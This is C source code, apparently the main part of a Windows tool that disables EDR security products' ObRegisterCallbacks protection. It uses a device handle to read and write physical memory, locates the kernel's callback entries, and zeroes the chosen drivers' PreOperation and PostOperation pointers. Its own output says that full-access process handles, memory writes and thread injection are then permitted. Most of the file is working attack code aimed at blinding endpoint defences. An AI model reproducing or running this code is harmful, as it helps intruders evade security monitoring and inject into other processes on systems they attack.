/* â”€â”€ Cache eviction â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
#define EVICT_SIZE (256*1024*1024)
static void cache_evict_once(void)
{
    volatile uint8_t *p=(volatile uint8_t*)
        VirtualAlloc(NULL,EVICT_SIZE,MEM_COMMIT|MEM_RESERVE,PAGE_READWRITE);
    if(!p){Sleep(100);return;}
    for(size_t i=0;i<EVICT_SIZE;i+=64) p[i]=(uint8_t)(i>>6);
    volatile uint64_t s=0;
    for(size_t i=EVICT_SIZE;i>=64;i-=64) s^=p[i-64];
    (void)s;
    VirtualFree((LPVOID)p,0,MEM_RELEASE); Sleep(10);
}
static void cache_evict_multiccd(void)
{
    SYSTEM_INFO si; GetSystemInfo(&si); DWORD ncpu=si.dwNumberOfProcessors;
    HANDLE thr=GetCurrentThread();
    DWORD_PTR orig=SetThreadAffinityMask(thr,1);
    SetThreadAffinityMask(thr,1ULL); Sleep(1); cache_evict_once();
    if(ncpu>1){SetThreadAffinityMask(thr,(DWORD_PTR)1<<(ncpu-1));Sleep(1);cache_evict_once();}
    SetThreadAffinityMask(thr,orig);
}

static BOOL WINAPI ctrl_handler(DWORD ev)
{
    if(ev==CTRL_C_EVENT||ev==CTRL_BREAK_EVENT||
       ev==CTRL_CLOSE_EVENT||ev==CTRL_LOGOFF_EVENT||ev==CTRL_SHUTDOWN_EVENT){
        if(g_any_zeroed){
            printf("\n[!] %s â€” emergency restore...\n",
                   ev==CTRL_C_EVENT?"Ctrl+C":"shutdown");
            fflush(stdout);
            do_restore_all();
            cache_evict_multiccd();
            fflush(stdout);
        }
        return FALSE;
    }
    return FALSE;
}

static void enable_debug_privilege(void)
{
    HANDLE hTok; TOKEN_PRIVILEGES tp={1};
    if(!OpenProcessToken(GetCurrentProcess(),TOKEN_ADJUST_PRIVILEGES|TOKEN_QUERY,&hTok)) return;
    LookupPrivilegeValueA(NULL,"SeDebugPrivilege",&tp.Privileges[0].Luid);
    tp.Privileges[0].Attributes=SE_PRIVILEGE_ENABLED;
    BOOL ok=AdjustTokenPrivileges(hTok,FALSE,&tp,0,NULL,NULL);
    printf("[*] SeDebugPrivilege: %s\n",(ok&&GetLastError()==0)?"enabled":"FAILED");
    CloseHandle(hTok);
}

static int parse_selection(const char *s, int ng)
{
    char buf[256]; strncpy(buf,s,255); buf[255]='\0';
    for(int i=(int)strlen(buf)-1;i>=0&&(buf[i]=='\n'||buf[i]=='\r'||buf[i]==' ');i--) buf[i]='\0';
    if(_stricmp(buf,"all")==0){
        for(int i=0;i<ng;i++) g_groups[i].selected=1;
        return ng;
    }
    if(_stricmp(buf,"edr")==0){
        int cnt=0;
        for(int i=0;i<ng;i++)
            if(g_groups[i].cls==DRV_OTHER){g_groups[i].selected=1;cnt++;}
        return cnt;
    }
    if(_stricmp(buf,"none")==0||buf[0]=='\0') return 0;
    int cnt=0; char *tok=strtok(buf,",");
    while(tok){
        int n=atoi(tok);
        if(n>=1&&n<=ng&&!g_groups[n-1].selected){g_groups[n-1].selected=1;cnt++;}
        tok=strtok(NULL,",");
    }
    return cnt;
}

/* â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â•â• */
int main(void)
{
    SetConsoleOutputCP(CP_UTF8);
    printf("=== ObRegisterCallbacks Bypass â€” Object Handle Interception ===\n\n");
    printf("  Targets: _OB_CALLBACK_ENTRY.PreOperation / PostOperation\n");
    printf("  Scope:   PsProcessType + PsThreadType callbacks\n");
    printf("  Effect:  EDRs can no longer strip OpenProcess / OpenThread access rights\n");
    printf("  Method:  Zero PreOperation/PostOperation pointers (null-checked by kernel)\n");
    printf("  Safety:  Pool memory â€” PatchGuard does NOT protect pool objects\n\n");

    g_dev=CreateFileW(DEVICE_NAME,GENERIC_READ|GENERIC_WRITE,FILE_SHARE_READ|FILE_SHARE_WRITE,NULL,OPEN_EXISTING,0,NULL);
    if(g_dev==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open device: %lu\n",GetLastError()); return 1;
    }
    printf("[+] Device opened\n");
    enable_debug_privilege();
    printf("\n");

    /* â”€â”€ Physical ranges â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    load_ranges();
    printf("[1] Physical ranges: %d\n",g_nranges);
    if(!g_nranges){printf("[-] No ranges\n");CloseHandle(g_dev);return 1;}
    for(int i=0;i<g_nranges;i++)
        printf("    [%d] 0x%016llX  %llu MB\n",i,
               (unsigned long long)g_ranges[i].base,
               (unsigned long long)(g_ranges[i].size>>20));
    printf("\n");

    /* â”€â”€ Module map â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    load_module_map();
    printf("[2] Kernel modules: %d\n\n",g_nmods);

    /* â”€â”€ ntoskrnl VA + path (reuse g_mods[0] loaded by load_module_map) â”€â”€ */
    if(!g_nmods){printf("[-] Module map empty\n");CloseHandle(g_dev);return 1;}
    uint64_t nt_va   = g_mods[0].base;
    uint32_t nt_size = (uint32_t)g_mods[0].size;
    char nt_path[512]={0};
    {
        char sysdir[MAX_PATH]; GetSystemDirectoryA(sysdir,sizeof sysdir);
        snprintf(nt_path,sizeof nt_path,"%s\\%s",sysdir,g_mods[0].name);
        if(GetFileAttributesA(nt_path)==INVALID_FILE_ATTRIBUTES)
            snprintf(nt_path,sizeof nt_path,"%s\\ntoskrnl.exe",sysdir);
    }

    printf("[3] ntoskrnl  VA=0x%016llX  size=0x%X\n    Path=%s\n\n",
           (unsigned long long)nt_va, nt_size, nt_path);

    /* â”€â”€ Read ntoskrnl PE from disk â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    HANDLE hf=CreateFileA(nt_path,GENERIC_READ,FILE_SHARE_READ,NULL,OPEN_EXISTING,0,NULL);
    if(hf==INVALID_HANDLE_VALUE){
        printf("[-] Cannot open %s\n",nt_path);CloseHandle(g_dev);return 1;
    }
    DWORD pe_sz=GetFileSize(hf,NULL);
    uint8_t *pe_buf=(uint8_t*)malloc(pe_sz);
    DWORD rd=0; ReadFile(hf,pe_buf,pe_sz,&rd,NULL); CloseHandle(hf);
    printf("[4] ntoskrnl.exe: %lu bytes\n\n",(unsigned long)pe_sz);

    /* â”€â”€ Find ntoskrnl PA â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[5] Finding ntoskrnl PA (2MB NtBuildNumber scan)...\n");
    uint64_t nt_pa = find_ntoskrnl_pa(nt_path);
    if(!nt_pa){
        printf("[-] ntoskrnl PA not found\n");free(pe_buf);CloseHandle(g_dev);return 1;
    }
    printf("    PA=0x%016llX\n\n",(unsigned long long)nt_pa);

    /* â”€â”€ Read PsProcessType / PsThreadType VAs â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[6] Reading PsProcessType / PsThreadType...\n");
    uint32_t rva_pt = pe_export_rva(pe_buf, pe_sz, "PsProcessType");
    uint32_t rva_tt = pe_export_rva(pe_buf, pe_sz, "PsThreadType");
    if (rva_pt) phys_read(nt_pa + rva_pt, &g_proc_type_va,   8);
    if (rva_tt) phys_read(nt_pa + rva_tt, &g_thread_type_va, 8);
    printf("    PsProcessType  RVA=0x%06X  *_OBJECT_TYPE=0x%016llX\n",
           rva_pt, (unsigned long long)g_proc_type_va);
    printf("    PsThreadType   RVA=0x%06X  *_OBJECT_TYPE=0x%016llX\n\n",
           rva_tt, (unsigned long long)g_thread_type_va);
    free(pe_buf);

    SetConsoleCtrlHandler(ctrl_handler, TRUE);

    /* â”€â”€ Stage 1: physical scan â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[7] Scanning physical memory for _OB_CALLBACK_ENTRY (9 guards)...\n\n");
    scan_physical();
    printf("\n    Raw entries found: %d\n\n", g_n_entries);

    if (!g_n_entries) {
        printf("[-] No entries found.\n");
        printf("    Possible causes:\n");
        printf("    - No EDR has called ObRegisterCallbacks\n");
        printf("    - _OB_CALLBACK_ENTRY layout differs on this build\n");
        CloseHandle(g_dev); return 0;
    }

    /* â”€â”€ Stage 2: group by driver â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[8] Groups by driver:\n\n");
    build_groups();
    print_groups();

    /* â”€â”€ Interactive selection â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("=============================================================\n");
    printf("  Commands: all / edr / none / 1,3 / ...\n");
    printf("  'edr' = auto-select only [EDR?] groups (skips SYS/NET/VM)\n");
    printf("  WARNING: [SYS] groups are OS-critical â€” zeroing causes BSOD\n");
    printf("=============================================================\n\n");

    int n_sel = 0;
    while (1) {
        printf("  > "); fflush(stdout);
        char line[256]={0}; fgets(line,sizeof line,stdin);
        line[strcspn(line,"\r\n")] = '\0';

        /* Clear previous selection */
        for(int i=0;i<g_n_groups;i++) g_groups[i].selected=0;

        n_sel = parse_selection(line, g_n_groups);
        if (!n_sel) { printf("  No groups selected â€” exiting.\n"); goto done; }

        /* Safety: warn if any SYS/NET/VM group selected */
        int has_unsafe = 0;
        for(int i=0;i<g_n_groups;i++)
            if(g_groups[i].selected && g_groups[i].cls != DRV_OTHER) has_unsafe=1;
        if (has_unsafe) {
            printf("\n  [!] WARNING: selection includes [SYS]/[NET]/[VM] drivers.\n");
            printf("      This WILL cause a BSOD.\n");
            printf("      Type 'yes-i-know' to proceed, or re-enter selection: ");
            fflush(stdout);
            char confirm[32]={0}; fgets(confirm,sizeof confirm,stdin);
            confirm[strcspn(confirm,"\r\n")] = '\0';
            if (strcmp(confirm,"yes-i-know") != 0) {
                printf("  Cleared. Re-enter selection.\n\n"); continue;
            }
        }
        break;
    }

    printf("\n  Selected: ");
    for(int i=0;i<g_n_groups;i++)
        if(g_groups[i].selected) printf("[%d]%s ",i+1,g_groups[i].driver);
    printf("\n  Proceed? [y/N]: "); fflush(stdout);
    char yn[8]={0}; fgets(yn,sizeof yn,stdin);
    if(yn[0]!='y'&&yn[0]!='Y'){printf("  Aborted.\n");goto done;}
    printf("\n");

    /* â”€â”€ Disable â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[9] Zeroing PreOperation / PostOperation...\n\n");
    for(int i=0;i<g_n_groups;i++){
        if(!g_groups[i].selected) continue;
        printf("  Group [%d] %s:\n",i+1,g_groups[i].driver);
        disable_group(&g_groups[i]);
        printf("\n");
    }

    printf("[10] Cache eviction (multi-CCD)... ");fflush(stdout);
    cache_evict_multiccd();
    printf("done\n\n");

    printf("=============================================================\n");
    printf("  ObRegisterCallbacks: DISABLED for selected drivers\n\n");
    printf("  Effect:\n");
    printf("    OpenProcess(PROCESS_ALL_ACCESS) â†’ handle granted without stripping\n");
    printf("    NtReadVirtualMemory / WriteProcessMemory â†’ access permitted\n");
    printf("    Thread injection (SetContextThread, CreateRemoteThread) â†’ permitted\n\n");
    printf("  Press Enter to RESTORE.  Ctrl+C also restores.\n");
    printf("=============================================================\n");
    fflush(stdout); getchar();

    /* â”€â”€ Restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("\n[11] Restoring...\n\n");
    do_restore_all();
    cache_evict_multiccd();

    /* â”€â”€ Verify restore â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€ */
    printf("[12] Verifying:\n");
    int v_ok=0, v_total=0;
    for(int i=0;i<g_n_groups;i++){
        if(!g_groups[i].selected) continue;
        for(int k=0;k<g_groups[i].n;k++){
            ObEntry *e=&g_entries[g_groups[i].indices[k]];
            v_total++;
            uint64_t cur=0;
            if(phys_read(e->preop_pa,&cur,8)&&
               memcmp(&cur,e->orig_preop,8)==0) v_ok++;
        }
    }
    printf("    %d/%d entries restored\n\n",v_ok,v_total);
    if(v_ok<v_total) printf("[!] Some entries not verified â€” reboot recommended\n\n");

    printf("[+] Done. Object callbacks re-enabled.\n");

done:
    CloseHandle(g_dev);
    return 0;
}
